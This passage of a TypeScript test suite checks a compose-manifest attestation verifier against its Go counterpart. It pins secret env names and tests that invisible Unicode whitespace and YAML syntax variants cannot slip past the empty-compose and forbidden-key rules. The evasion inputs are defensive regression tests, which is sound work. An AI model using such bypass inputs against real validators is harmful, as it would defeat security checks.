    // drifting — and a drift here means the proxy and the browser client
    // reach different verdicts on identical evidence, silently.
    it('matches the Go policy’s pinned values', () => {
        const p = zeroSignalComposePolicy()
        expect(p.manifestVersion).toBe(2)
        expect(p.runner).toBe('docker-compose')
        expect(p.enforceEnvAllowlist).toBe(true)
        expect(p.allowedEnvSuffixes).toEqual(['_MNEMONIC'])
        expect(p.preLaunchScriptDigests).toEqual(phalaPreLaunchDigests())
        expect(p.toggles?.local_key_provider_enabled).toBe(false)
        // Pinned by VALUE here and cross-checked against Go's own slice in
        // attest-compose-vectors.test.ts. Both are needed: this one catches
        // an edit to this file, that one catches the two languages drifting
        // apart. Neither alone does — a literal list agrees with itself, and
        // the vectors are generated FROM Go, so a name deleted there and
        // regenerated would leave both green without this.
        //
        // Every entry must carry a credential and reach no setting. Adding
        // one widens the unmeasured env channel, which the "configuration is
        // inside the measurement" claim rests on staying narrow.
        expect([...zeroSignalSecretEnvNames()].sort()).toEqual([
            'NODE_ALGOD_TOKEN',
            'NODE_IMAGE_LLM_OPENAI_API_KEY',
            'NODE_LLM_COMFYUI_CLOUD_API_KEY',
            'NODE_LLM_OPENAI_API_KEY',
            'ZS_MNEMONIC_URLS',
        ])
    })
})

/**
 * The Go twin is `TestUnicodeWhitespace_DoesNotMoveAnyVerdict` in
 * go/attest/compose_unicode_test.go. Both must exist: a single-language test of
 * a cross-language predicate agrees with itself by construction.
 *
 * This is a regression pin for a divergence that shipped, and that neither
 * suite could see. Every whitespace decision in compose.ts used
 * `String.prototype.trim` and every one in compose.go used
 * `strings.TrimSpace`. Those are NOT the same predicate — U+0085 (NEL) is
 * space to Go and not to JS, U+FEFF (BOM) is space to JS and not to Go — and
 * the difference was load-bearing at eleven call sites. Measured, in both
 * directions: a `docker_compose_file` of one U+0085 was `empty_docker_compose`
 * in Go and ACCEPTED here, one U+FEFF was the reverse.
 *
 * That was a live fail-open, not a cosmetic split: `empty_docker_compose` is
 * the only rule guarding `docker_compose_file` while consumers ship
 * `enforceComposeSkeleton` false.
 *
 * Codepoints are COMPUTED, never written as characters or escapes — both are
 * invisible in an editor, and a literal U+FEFF is a compile error on the Go
 * side, which is how the first draft of the twin failed.
 */
describe('unicode whitespace does not move any verdict', () => {
    const NEL = String.fromCharCode(0x0085)
    const BOM = String.fromCharCode(0xfeff)
    const CASES: ReadonlyArray<[string, string]> = [
        ['nel', NEL],
        ['bom', BOM],
    ]

    it('treats both as an empty docker_compose', () => {
        // This assertion was originally the other way round — "neither
        // reports empty" — on the reasoning that either answer was
        // defensible so long as the two languages agreed. Making them agree
        // was necessary and not sufficient: the golden vectors then showed
        // them agreeing on the WRONG answer, because a compose of one
        // invisible character sailed past `empty_docker_compose`, which is
        // the only rule guarding `docker_compose_file` while consumers ship
        // `enforceComposeSkeleton` false. One character disabled it.
        //
        // So the vacuous-compose test is `isBlank`, the union of both
        // languages' whitespace notions, deliberately the opposite extreme
        // from `trimAscii`. Everything that could be nothing counts as
        // nothing.
        for (const [name, c] of CASES) {
            const doc = `{"manifest_version":2,"runner":"docker-compose","docker_compose_file":"${c}"}`
            let violations: readonly Violation[] = []
            try {
                verifyAppCompose(doc, sealed(doc), {})
            } catch (e) {
                if (e instanceof ComposeError) violations = e.violations
                else throw e
            }
            expect(hasCode(violations, 'empty_docker_compose'), name).toBe(true)
        }
    })

    it('computes the same skeleton digest Go computes', () => {
        // Pinned as literals the Go twin asserts against. The digests DO
        // move relative to the baseline — an unindented line ends the block
        // scalar under YAML's own rule, so it correctly leaves the elided
        // span — and that is fine. What must hold is that both languages
        // move it to the same place.
        const want: Record<string, string> = {
            nel: 'fea9251a8b5dbdeb893c972b1e496ce3f4b8c1d75c89e7b6fea26b46a4e072f6',
            bom: 'b93c12b1ec0e7d598ac3e51d98d3604b3f634285580d8b728c289334cada8598',
        }
        for (const [name, c] of CASES) {
            const { skeleton } = extractComposeSkeleton(
                realisticCompose(REAL_IMAGE, SOME_CONFIG + c + '\n'),
            )
            expect(composeSkeletonDigest(skeleton), name).toBe(want[name])
        }
    })

    it('trims neither off an image reference', () => {
        for (const [name, c] of CASES) {
            const { imageRef } = extractComposeSkeleton(
                realisticCompose(REAL_IMAGE + c, SOME_CONFIG),
            )
            expect(imageRef, name).not.toBe(REAL_IMAGE)
        }
    })

    it('trims neither out of an env name', () => {
        // The env allowlist is the rule this module's own comments call the
        // most load-bearing, and it is set membership on a trimmed,
        // upper-cased name — so a trim that differs is a membership that
        // differs.
        for (const [name, c] of CASES) {
            const doc =
                `{"manifest_version":2,"runner":"docker-compose",` +
                `"docker_compose_file":"services: {}\\n",` +
                `"allowed_envs":["${zeroSignalSecretEnvNames()[0]}${c}"]}`
            const violations = violationsOf(() =>
                verifyAppCompose(doc, sealed(doc), zeroSignalComposePolicy()),
            )
            expect(hasCode(violations, 'env_not_allowed'), name).toBe(true)
        }
    })
})

/**
 * The engine-config span, tested against THIS implementation rather than only
 * through the golden vectors.
 *
 * Until these existed, `proto/ts` had no hand-written engine-config test at
 * all — the vectors were its entire coverage, so every case Go pinned as a
 * unit test and no vector carried was unprotected on the payer's browser side.
 * That asymmetry is the one nothing reports at runtime: a rule weakened in TS
 * alone has the proxy refuse a node the client admits.
 */
describe('engineConfigViolations', () => {
    const engineCompose = (engineConfig: string) =>
        `services:\n` +
        `  zs-node:\n` +
        `    image: ${REAL_IMAGE}\n` +
        `configs:\n` +
        `  zs-engine-config:\n` +
        `    content: |\n` +
        engineConfig

    // Sizing keys are the whole reason the span is lifted. If these refused,
    // the third span would be a ban on itself.
    it('admits sizing keys', () => {
        expect(
            engineConfigViolations(
                engineCompose('      m:\n        context-window: 4096\n        nseq-max: 2\n'),
            ),
        ).toEqual([])
    })

    // The evasion table. Every row is valid YAML that a key-position scan
    // walks straight through, which is why the rule is a substring test:
    // enumerating the positions means enumerating YAML, in front of a
    // security question. It over-refuses, and that is the accepted cost.
    it.each([
        ['a plain key', '      m:\n        adapters:\n          - id: x\n'],
        ['uppercase', '      m:\n        ADAPTERS:\n          - id: x\n'],
        ['mixed case', '      m:\n        Adapters:\n          - id: x\n'],
        ['a space before the colon', '      m:\n        adapters : [x]\n'],
        ['a tab before the colon', '      m:\n        adapters\t: [x]\n'],
        ['flow style', '      m: {context-window: 4096, adapters: [x]}\n'],
        ['a block-sequence entry', '      m:\n        - adapters: [x]\n'],
        ['an explicit key', '      m:\n        ? adapters\n        : [x]\n'],
    ])('refuses %s', (_name, body) => {
        expect(engineConfigViolations(engineCompose(body))).toContain('adapters')
    })

    it('refuses a replaced chat template', () => {
        expect(
            engineConfigViolations(engineCompose('      m:\n        template: /k/mine.jinja\n')),
        ).toContain('template')
    })

    // A malformed document that MENTIONS the sentinel cannot be read as clean.
    // With enforceComposeSkeleton off, this rule is the only thing reading the
    // document, so failing open on an extraction error failed open entirely.
    it('treats an unparseable compose mentioning the sentinel as a violation', () => {
        const malformed = engineCompose('      m:\n        adapters: [x]\n').replace(
            '  zs-node:',
            '\tzs-node:',
        )
        expect(engineConfigViolations(malformed)).toEqual(['unparseable-compose'])
    })

    // A document with no engine span at all is not this rule's business, and
    // an extraction error there must stay silent — otherwise every unrelated
    // malformed compose reports an engine-config violation it does not have.
    it('says nothing about a document with no engine span', () => {
        expect(engineConfigViolations('services:\n  zs-node:\n    image: nope\n')).toEqual([])
    })

    // `as const` is a TYPE-level assertion and freezes nothing at runtime, so
    // returning the module's own array would let any importer empty the rule
    // for the whole process — the gate then reads clean on every document.
    // Go pins the copy; this goes one step further and re-asks the question
    // the gate actually answers.
    it('cannot have its rule edited by a caller', () => {
        const keys = engineConfigForbiddenKeys()
        expect(keys).toContain('adapters')
        keys.length = 0
        keys.push('nothing-real')

        expect(engineConfigForbiddenKeys()).toContain('adapters')
        expect(engineConfigViolations(engineCompose('      m:\n        adapters: [x]\n'))).toContain(
            'adapters',
        )
    })
})
